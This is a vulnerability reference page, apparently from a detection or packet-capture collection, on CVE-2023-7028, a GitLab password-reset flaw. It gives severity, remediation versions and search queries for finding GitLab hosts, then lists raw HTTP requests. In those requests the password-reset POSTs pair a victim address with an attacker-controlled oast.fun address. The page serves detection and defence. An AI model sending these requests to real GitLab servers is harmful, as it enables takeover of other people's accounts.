---
layout: "post"
cve_id: "CVE-2023-7028"
title: "GitLab - Account Takeover via Password Reset"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-7028.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-7028.yaml"
author: "DhiyaneshDk,rootxharsh,iamnooob,pdresearch"
severity: "high"
impact: "Unauthenticated attackers can send password reset emails to unverified email addresses, enabling account takeover by intercepting the reset link sent to an attacker-controlled email.
"
remediation: "Upgrade GitLab to version 16.1.6, 16.2.9, 16.3.7, 16.4.5, 16.5.6, 16.6.4, 16.7.2, or later depending on your version.
"
reference:
  - "https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/"
  - "https://x.com/rwincey/status/1745659710089437368?s=20"
  - "https://gitlab.com/gitlab-org/gitlab/-/issues/436084"
  - "https://hackerone.com/reports/2293343"
  - "https://github.com/V1lu0/CVE-2023-7028"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2023-7028', 'cwe-id': 'CWE-640,CWE-284', 'epss-score': 0.93604, 'epss-percentile': 0.99823, 'cpe': 'cpe:2.3:a:gitlab:gitlab:*:*:*:*:community:*:*:*'}"
metadata: "{'verified': True, 'max-request': 6, 'vendor': 'gitlab', 'product': 'gitlab', 'shodan-query': ['title:"Gitlab"', 'cpe:"cpe:2.3:a:gitlab:gitlab"', 'http.title:"gitlab"'], 'fofa-query': 'title="gitlab"', 'google-query': 'intitle:"gitlab"'}"
tags:
  - "hackerone"
  - "cve"
  - "cve2023"
  - "gitlab"
  - "auth-bypass"
  - "intrusive"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
An issue has been discovered in GitLab CE/EE affecting all versions from 16.1 prior to 16.1.6, 16.2 prior to 16.2.9, 16.3 prior to 16.3.7, 16.4 prior to 16.4.5, 16.5 prior to 16.5.6, 16.6 prior to 16.6.4, and 16.7 prior to 16.7.2 in which user account password reset emails could be delivered to an unverified email address.


## üåê HTTP Request
```nohighlight
GET /users/sign_in HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /users/password HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Origin: /
Referer: //users/password/new
Accept-Encoding: gzip

authenticity_token=h4XbX6&user[email][]=admin@example.com&user[email][]=NYirRA@d5is5rple0o3qs1n99f08j5f56mt4q16r.oast.fun
```

```nohighlight
POST /users/password HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Content-Length: 120
Content-Type: application/x-www-form-urlencoded
Origin: /
Referer: //users/password/new
Accept-Encoding: gzip

authenticity_token=h4XbX6&user[email][]=admin@victim.com&user[email][]=iiPFWq@d5is5rple0o3qs1n99f0m3hg17x1ak5gr.oast.fun
```

```nohighlight
POST /users/password HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.4
Content-Length: 118
Content-Type: application/x-www-form-urlencoded
Origin: /
Referer: //users/password/new
Accept-Encoding: gzip

authenticity_token=h4XbX6&user[email][]=git@victim.com&user[email][]=OAQmfx@d5is5rple0o3qs1n99f0t3ij7kq1nfpx9.oast.fun
```

```nohighlight
POST /users/password HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Length: 119
Content-Type: application/x-www-form-urlencoded
Origin: /
Referer: //users/password/new
Accept-Encoding: gzip

authenticity_token=h4XbX6&user[email][]=root@victim.com&user[email][]=4aJBCf@d5is5rple0o3qs1n99f0xintzxno4k8et.oast.fun
```

```nohighlight
POST /users/password HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Origin: /
Referer: //users/password/new
Accept-Encoding: gzip

authenticity_token=h4XbX6&user[email][]=gitlab@victim.com&user[email][]=jGsbZj@d5is5rple0o3qs1n99f0p6fp3bcz4jrqq.oast.fun
```

